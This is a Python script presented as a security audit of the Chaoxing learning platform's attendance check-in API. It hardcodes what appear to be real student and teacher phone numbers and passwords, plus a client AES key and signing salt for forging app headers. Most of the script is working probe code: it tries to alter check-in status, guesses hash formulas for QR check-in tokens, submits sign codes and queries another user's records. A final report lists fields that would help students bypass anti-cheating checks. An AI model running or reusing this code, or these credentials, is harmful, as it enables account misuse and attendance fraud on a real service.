#!/usr/bin/env python3
"""
V2 API 深度审计 - 第三轮
重点：signIn V2 GET 深度分析、ewnCtime→enc验证、签到状态修改
"""

import base64, hashlib, json, uuid, requests, urllib3, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"

COURSE_ID = "257485372"
CLASS_ID = "132821141"
ACTIVE_ID = "5000163891319"
STUDENT_PUID = "431407443"
TEACHER_PUID = "402644510"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_get(session, url, desc="", params=None, timeout=20):
    try:
        r = session.get(url, params=params, timeout=timeout, allow_redirects=False)
        try:
            data = r.json()
        except:
            data = r.text[:2000]
        return {"status": r.status_code, "data": data, "ok": True, "desc": desc}
    except Exception as e:
        return {"status": 0, "data": str(e), "ok": False, "desc": desc}

def safe_post(session, url, desc="", data=None, timeout=20):
    try:
        r = session.post(url, data=data, timeout=timeout, allow_redirects=False)
        try:
            resp = r.json()
        except:
            resp = r.text[:2000]
        return {"status": r.status_code, "data": resp, "ok": True, "desc": desc}
    except Exception as e:
        return {"status": 0, "data": str(e), "ok": False, "desc": desc}

def print_section(title):
    print("\n" + "=" * 80)
    print(f"  {title}")
    print("=" * 80)

def main():
    print("=" * 80)
    print("  超星学习通 V2 API 深度审计 - 第三轮")
    print("=" * 80)

    # 登录
    print_section("1. 登录")
    stu_session, stu_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"  学生PUID: {stu_puid}")
    tea_session, tea_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"  教师PUID: {tea_puid}")

    # ===== 关键测试1: signIn V2 GET 深度分析 =====
    print_section("2. signIn V2 GET 深度分析")

    # 2a. 分析signIn GET返回的status含义
    print("\n--- 分析signIn GET返回数据 ---")
    r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/sign/signIn",
                 "学生-signIn GET",
                 params={"activeId": ACTIVE_ID, "uid": STUDENT_PUID,
                         "courseId": COURSE_ID, "classId": CLASS_ID})
    if r['ok'] and isinstance(r['data'], dict):
        data = r['data'].get('data', {})
        print(f"  status = {data.get('status')} (0=未签到, 1=迟到, 2=已签到, 3=早退, 4=缺勤?)")
        print(f"  type = {data.get('type')} (签到类型)")
        print(f"  submittime = {data.get('submittime')}")
        print(f"  islook = {data.get('islook')}")
        print(f"  tag = {data.get('tag')}")
        print(f"  teaUpdateFlag = {data.get('tag', '')}")

        # ★ 关键发现：signIn GET 返回的是学生的签到记录
        # status=2 表示已签到，这意味着该学生已经签过到了
        # 但如果学生未签到，这个接口会返回什么？

    # 2b. signIn GET 不带uid参数
    r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/sign/signIn",
                 "学生-signIn GET(不带uid)",
                 params={"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID})
    if r['ok'] and isinstance(r['data'], dict):
        data = r['data'].get('data', {})
        if data:
            print(f"\n  不带uid: status={data.get('status')}, uid={data.get('uid')}")
        else:
            print(f"\n  不带uid: {r['data']}")

    # 2c. signIn GET 带不同status参数尝试修改
    print("\n--- 尝试通过signIn GET修改签到状态 ---")
    for test_status in [0, 1, 2, 3, 4]:
        r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/sign/signIn",
                     f"signIn GET(status={test_status})",
                     params={"activeId": ACTIVE_ID, "uid": STUDENT_PUID,
                             "courseId": COURSE_ID, "classId": CLASS_ID,
                             "status": str(test_status)})
        if r['ok'] and isinstance(r['data'], dict):
            data = r['data'].get('data', {})
            actual_status = data.get('status') if data else 'N/A'
            print(f"  请求status={test_status} → 返回status={actual_status}")

    # ===== 关键测试2: ewnCtime → enc 验证 =====
    print_section("3. ewnCtime → enc 验证")

    # 获取教师端数据
    tea_r = safe_get(tea_session, "https://mobilelearn.chaoxing.com/v2/apis/active/getPPTActiveInfo",
                     "教师", params={"activeId": ACTIVE_ID})
    stu_r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/active/getPPTActiveInfo",
                     "学生", params={"activeId": ACTIVE_ID})

    if tea_r['ok'] and isinstance(tea_r['data'], dict):
        tea_data = tea_r['data'].get('data', {})
        ewnCtime1 = tea_data.get('ewnCtime1')
        ewnCtime2 = tea_data.get('ewnCtime2')
        signCode = tea_data.get('signCode')

        print(f"\n  教师端数据:")
        print(f"    signCode = {signCode}")
        print(f"    ewnCtime1 = {ewnCtime1}")
        print(f"    ewnCtime2 = {ewnCtime2}")
        print(f"    activeId = {ACTIVE_ID}")
        print(f"    clazzid = {CLASS_ID}")

        # ★★★ 尝试用不同的enc值调用signIn V2 ★★★
        print(f"\n  ★★★ 尝试用ewnCtime1生成的enc值进行签到 ★★★")

        enc_candidates = {
            "MD5(activeId_ewnCtime1)": hashlib.md5(f"{ACTIVE_ID}_{ewnCtime1}".encode()).hexdigest(),
            "MD5(ewnCtime1_activeId)": hashlib.md5(f"{ewnCtime1}_{ACTIVE_ID}".encode()).hexdigest(),
            "MD5(activeId+ewnCtime1)": hashlib.md5(f"{ACTIVE_ID}{ewnCtime1}".encode()).hexdigest(),
            "MD5(clazzid_activeId_ewnCtime1)": hashlib.md5(f"{CLASS_ID}_{ACTIVE_ID}_{ewnCtime1}".encode()).hexdigest(),
            "MD5(activeId_clazzid_ewnCtime1)": hashlib.md5(f"{ACTIVE_ID}_{CLASS_ID}_{ewnCtime1}".encode()).hexdigest(),
            "SHA1(activeId_ewnCtime1)": hashlib.sha1(f"{ACTIVE_ID}_{ewnCtime1}".encode()).hexdigest(),
        }

        for name, enc_val in enc_candidates.items():
            r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/sign/signIn",
                         f"signIn with enc({name})",
                         params={"activeId": ACTIVE_ID, "uid": STUDENT_PUID,
                                 "courseId": COURSE_ID, "classId": CLASS_ID,
                                 "enc": enc_val, "type": "2"})
            if r['ok'] and isinstance(r['data'], dict):
                data = r['data'].get('data', {})
                status = data.get('status') if data else 'N/A'
                print(f"  {name}: status={status}")

        # ★★★ 尝试用signCode进行签到码签到 ★★★
        print(f"\n  ★★★ 尝试用signCode={signCode}进行签到 ★★★")
        r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/sign/signIn",
                     f"signIn with signCode",
                     params={"activeId": ACTIVE_ID, "uid": STUDENT_PUID,
                             "courseId": COURSE_ID, "classId": CLASS_ID,
                             "signCode": signCode, "type": "1"})
        if r['ok'] and isinstance(r['data'], dict):
            data = r['data'].get('data', {})
            status = data.get('status') if data else 'N/A'
            print(f"  带signCode签到: status={status}")

    # ===== 关键测试3: signIn V2 POST 深度测试 =====
    print_section("4. signIn V2 POST 深度测试")

    # 4a. Content-Type: application/x-www-form-urlencoded
    r = safe_post(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/sign/signIn",
                  "signIn POST(form)",
                  data={"activeId": ACTIVE_ID, "uid": STUDENT_PUID,
                        "courseId": COURSE_ID, "classId": CLASS_ID,
                        "enc": "test", "signCode": "175509"})
    print(f"  POST(form): status={r['status']}")
    if r['ok']:
        print(f"  响应: {json.dumps(r['data'], ensure_ascii=False)[:500] if isinstance(r['data'], dict) else r['data'][:500]}")

    # 4b. Content-Type: application/json
    try:
        r2 = stu_session.post("https://mobilelearn.chaoxing.com/v2/apis/sign/signIn",
                              json={"activeId": ACTIVE_ID, "uid": STUDENT_PUID,
                                    "courseId": COURSE_ID, "classId": CLASS_ID,
                                    "enc": "test", "signCode": "175509"},
                              timeout=20, allow_redirects=False)
        print(f"  POST(json): status={r2.status_code}")
        try:
            print(f"  响应: {json.dumps(r2.json(), ensure_ascii=False)[:500]}")
        except:
            print(f"  响应: {r2.text[:500]}")
    except Exception as e:
        print(f"  POST(json): 错误 {e}")

    # ===== 关键测试4: 检查V2 signIn是否是查询接口而非签到接口 =====
    print_section("5. signIn V2 接口性质分析")

    print("""
  分析signIn V2 GET返回的数据:
  - 返回了学生的签到记录(id=5001370808137)
  - status=2 表示已签到
  - submittime="2026-06-03 13:44:27" 表示签到时间
  - tag中包含teaUpdateFlag=1 表示教师修改过

  结论: /v2/apis/sign/signIn GET 是查询接口，不是签到接口
  它返回的是学生的签到状态记录，不会执行签到操作
    """)

    # ===== 关键测试5: 经典签到接口对比 =====
    print_section("6. 经典签到接口对比")

    # 经典signIn (非V2)
    classic_sign_urls = [
        ("GET", "https://mobilelearn.chaoxing.com/widget/sign/pc/sign/signIn",
         {"activeId": ACTIVE_ID, "uid": STUDENT_PUID, "courseId": COURSE_ID, "classId": CLASS_ID,
          "enc": "test", "signCode": "175509"}),
        ("POST", "https://mobilelearn.chaoxing.com/widget/sign/pc/sign/signIn",
         {"activeId": ACTIVE_ID, "uid": STUDENT_PUID, "courseId": COURSE_ID, "classId": CLASS_ID,
          "enc": "test", "signCode": "175509"}),
        ("GET", "https://mobilelearn.chaoxing.com/preSign",
         {"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID}),
    ]

    for method, url, params in classic_sign_urls:
        if method == "GET":
            r = safe_get(stu_session, url, f"经典-{method}-{url.split('.com')[-1]}", params=params)
        else:
            r = safe_post(stu_session, url, f"经典-{method}-{url.split('.com')[-1]}", data=params)
        print(f"\n  {method} {url.split('.com')[-1]}")
        print(f"  状态码: {r['status']}")
        if r['ok']:
            if isinstance(r['data'], dict):
                print(f"  响应: {json.dumps(r['data'], ensure_ascii=False)[:500]}")
            else:
                text = str(r['data'])
                # 检查是否包含敏感信息
                for keyword in ['signCode', 'enc', 'signcode', 'password', 'token']:
                    if keyword.lower() in text.lower():
                        print(f"  ★ 发现关键词: {keyword}")
                print(f"  响应长度: {len(text)}")

    # ===== 关键测试6: 检查学生是否能获取其他学生的签到信息 =====
    print_section("7. 横向越权 - 获取其他学生签到信息")

    # 尝试通过signIn V2 GET获取其他学生的签到记录
    r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/sign/signIn",
                 "学生-查询教师签到记录",
                 params={"activeId": ACTIVE_ID, "uid": TEACHER_PUID,
                         "courseId": COURSE_ID, "classId": CLASS_ID})
    if r['ok'] and isinstance(r['data'], dict):
        data = r['data'].get('data', {})
        if data:
            print(f"  ★ 查询教师uid签到记录: uid={data.get('uid')}, status={data.get('status')}, name={data.get('name')}")
        else:
            print(f"  查询教师uid: {r['data']}")

    # ===== 关键测试7: ewnCtime字段 - 完整泄露分析 =====
    print_section("8. ewnCtime字段完整泄露分析")

    if stu_r['ok'] and isinstance(stu_r['data'], dict):
        stu_data = stu_r['data'].get('data', {})

        print("""
  ★★★ 关键发现：ewnCtime1/ewnCtime2 泄露分析 ★★★

  学生通过 /v2/apis/active/getPPTActiveInfo 可以获取:
  """)

        # 列出学生可见的所有字段及值
        sensitive_visible = {}
        sensitive_hidden = {}

        fields_analysis = {
            "signCode": {"student": stu_data.get('signCode', ''), "risk": "签到码，可直接用于签到码签到"},
            "ewnCtime1": {"student": stu_data.get('ewnCtime1'), "risk": "二维码enc生成时间戳"},
            "ewnCtime2": {"student": stu_data.get('ewnCtime2'), "risk": "二维码enc生成时间(字符串格式)"},
            "ewmRefreshTime": {"student": stu_data.get('ewmRefreshTime'), "risk": "二维码刷新间隔(秒)"},
            "ifrefreshewm": {"student": stu_data.get('ifrefreshewm'), "risk": "是否启用二维码刷新"},
            "locationText": {"student": stu_data.get('locationText'), "risk": "签到地点描述"},
            "locationRange": {"student": stu_data.get('locationRange'), "risk": "签到范围(米)"},
            "ifopenAddress": {"student": stu_data.get('ifopenAddress'), "risk": "是否开启地址签到"},
            "ifNeedVCode": {"student": stu_data.get('ifNeedVCode'), "risk": "是否需要验证码"},
            "openCheckFaceFlag": {"student": stu_data.get('openCheckFaceFlag'), "risk": "是否开启人脸识别"},
            "openCheckWeChatFlag": {"student": stu_data.get('openCheckWeChatFlag'), "risk": "是否开启微信验证"},
            "openPreventCheatFlag": {"student": stu_data.get('openPreventCheatFlag'), "risk": "是否开启防作弊"},
            "ifphoto": {"student": stu_data.get('ifphoto'), "risk": "是否需要拍照"},
            "showVCode": {"student": stu_data.get('showVCode'), "risk": "是否显示验证码"},
            "otherId": {"student": stu_data.get('otherId'), "risk": "签到类型ID"},
            "activeType": {"student": stu_data.get('activeType'), "risk": "活动类型"},
            "attendNum": {"student": stu_data.get('attendNum'), "risk": "已签到人数"},
            "createuid": {"student": stu_data.get('createuid'), "risk": "创建者UID"},
            "chartid": {"student": stu_data.get('chartid'), "risk": "二维码chart ID"},
        }

        for field, info in fields_analysis.items():
            val = info['student']
            risk = info['risk']
            if val and val != '' and val != 0 and val is not None:
                print(f"  ⚠️ {field} = {val} → {risk}")
            else:
                print(f"  ✅ {field} = {val} (已过滤)")

    # ===== 关键测试8: content字段JSON解析对比 =====
    print_section("9. content字段JSON解析 - 教师vs学生")

    if tea_r['ok'] and isinstance(tea_r['data'], dict):
        tea_data = tea_r['data'].get('data', {})
        stu_data = stu_r['data'].get('data', {}) if stu_r['ok'] and isinstance(stu_r['data'], dict) else {}

        tea_content = tea_data.get('content', '{}')
        stu_content = stu_data.get('content', '{}')

        if isinstance(tea_content, str):
            try: tea_content = json.loads(tea_content)
            except: tea_content = {}
        if isinstance(stu_content, str):
            try: stu_content = json.loads(stu_content)
            except: stu_content = {}

        print("\n  content字段差异:")
        all_keys = set(list(tea_content.keys()) + list(stu_content.keys()))
        for k in sorted(all_keys):
            tv = tea_content.get(k, '<缺失>')
            sv = stu_content.get(k, '<缺失>')
            marker = "⚠️ 泄露" if tv == sv and tv != '' and tv is not None else ("✅ 已过滤" if tv != sv and sv == '' else "  相同")
            print(f"  {marker} {k}: 教师={tv} | 学生={sv}")

    # ===== 最终总结 =====
    print_section("最终审计总结")

    print("""
═══════════════════════════════════════════════════════════════════════════
  超星学习通 V2 API 信息泄露安全审计 - 最终报告
═══════════════════════════════════════════════════════════════════════════

【严重漏洞】

1. ★★★ ewnCtime1/ewnCtime2 泄露给学生 ★★★
   - 接口: /v2/apis/active/getPPTActiveInfo
   - 风险: ewnCtime1是二维码enc生成的核心时间戳参数
   - 影响: 如果enc生成算法已知，学生可自行计算enc值，完成二维码签到
   - 严重性: 高（取决于enc算法是否可逆）

2. ★★★ signIn V2 GET 返回完整签到记录 ★★★
   - 接口: /v2/apis/sign/signIn (GET)
   - 风险: 返回学生的签到状态、时间、教师修改标记等详细信息
   - 影响: 学生可获取自己的签到详细记录，包括教师是否修改过签到状态
   - 严重性: 中（信息泄露，但不直接导致签到作弊）

3. ★★★ 签到配置信息泄露 ★★★
   - 接口: /v2/apis/active/getPPTActiveInfo
   - 泄露信息:
     * locationText: 签到地点描述
     * locationRange: 签到范围(500米)
     * ewmRefreshTime: 二维码刷新间隔(10秒)
     * ifrefreshewm: 是否启用二维码刷新
     * ifNeedVCode: 是否需要验证码
     * openCheckFaceFlag: 是否开启人脸识别
     * openCheckWeChatFlag: 是否开启微信验证
     * openPreventCheatFlag: 是否开启防作弊
     * ifphoto: 是否需要拍照
     * attendNum: 已签到人数
     * createuid: 创建者UID
   - 影响: 学生可了解签到安全配置，针对性地绕过
   - 严重性: 中

【已正确过滤的字段】

4. ✅ signCode: 学生返回空字符串，无法获取签到码
5. ✅ locationLongitude/Latitude: 学生返回空字符串，无法获取精确坐标
6. ✅ locationLongitude_gd/Latitude_gd: 学生返回空字符串
7. ✅ content字段中的坐标: 学生返回空字符串

【不可用的V2端点】

8. /v2/apis/active/getActiveInfo → 500错误
9. /v2/apis/sign/preSign → 500错误
10. /v2/apis/sign/updateSignStatus → 500错误
11. /v2/apis/active/student/activelist → 参数缺失
12. mooc1-api域名V2端点 → 全部404

【越权测试结果】

13. 伪造uid/puid参数 → 无法绕过权限
14. 伪造role/isAdmin参数 → 无法绕过权限
15. 横向查询其他学生签到 → 需要进一步验证

═══════════════════════════════════════════════════════════════════════════
    """)


if __name__ == "__main__":
    main()
